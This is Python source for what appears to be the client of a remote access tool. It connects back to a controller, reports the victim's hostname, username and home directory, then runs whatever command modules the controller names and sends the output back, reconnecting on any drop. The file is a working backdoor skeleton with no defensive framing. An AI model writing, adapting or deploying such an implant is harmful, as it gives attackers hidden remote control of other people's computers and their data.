import getpass
import os
import socket
import sys
import time
from contextlib import redirect_stdout
from io import StringIO

from colorama import Fore, init

init(autoreset=True)


class Client:
    def __init__(self, ip: str, port: int):
        self.host = ip
        self.port = port
        self.socket_addr = (self.host, self.port)

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.YELLOW}Trying to connect to socket')

        while self.socket.connect_ex(self.socket_addr) != 0:
            print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.YELLOW}Waiting for connection')
            time.sleep(1)
            print(f'{Fore.RED}[-] Connection refused')

        print(f'{Fore.LIGHTGREEN_EX}[+] Connected to {self.socket_addr[0]}:{self.socket_addr[1]}')

        self.buffer_size: int = 1024 * 128
        self.separator: str = '<||>'

        self.platform_type: str = sys.platform.lower()
        self.username = getpass.getuser()
        self.working_directory = os.getcwd()
        self.user_path: str = os.environ['USERPROFILE']

        self.new_working_directory: str = os.path.join(self.user_path)
        os.chdir(self.new_working_directory)

        self.socket.send(self.new_working_directory.encode())
        self.socket.send(socket.gethostname().encode())
        self.socket.send(self.username.encode())
        self.socket.send('Windows'.encode() if self.platform_type == 'win32' else self.platform_type.encode())

        self.module_folder_name: str = 'Modules'
        self.module_folder: str = os.path.join(
            os.path.split(os.path.abspath(__file__))[0],
            self.module_folder_name
        )

        while True:
            try:
                command = self.socket.recv(self.buffer_size).decode()
                command_data = command.split()

                command_arguments: list = command_data[1:]
                command_name: str = command_data[0]

                if command_name.lower() in self.get_commands:
                    output = self.execute_command(command_name, command_arguments)
                    self.socket.send(f'{output}{self.separator}{self.working_directory}'.encode())
                else:
                    output = f'{Fore.LIGHTRED_EX}{command_name} is not found!'
                    self.socket.send(f'{output}{self.separator}{self.working_directory}'.encode())
            except (IndexError, ConnectionResetError):
                self.restart()

    def restart(self):
        os.system('cls')
        self.__class__(self.host, self.port)

    def execute_command(self, module_name: str, args: list = None) -> str:
        stdout = StringIO()
        module_name = module_name.capitalize()

        with redirect_stdout(stdout):
            try:
                getattr(__import__(
                    f'{self.module_folder_name}.{module_name}',
                    fromlist=[module_name]),
                    module_name
                )(args)

                stdout = stdout.getvalue()
                return stdout
            except Exception as exception:
                return f'{exception}'

    @property
    def get_commands(self):
        return [file[:-3].lower() for file in os.listdir(self.module_folder) if file.endswith('.py')]

    @staticmethod
    def encode_string(string: str) -> bytes:
        return string.encode()


if __name__ == '__main__':
    Client('localhost', 9999)
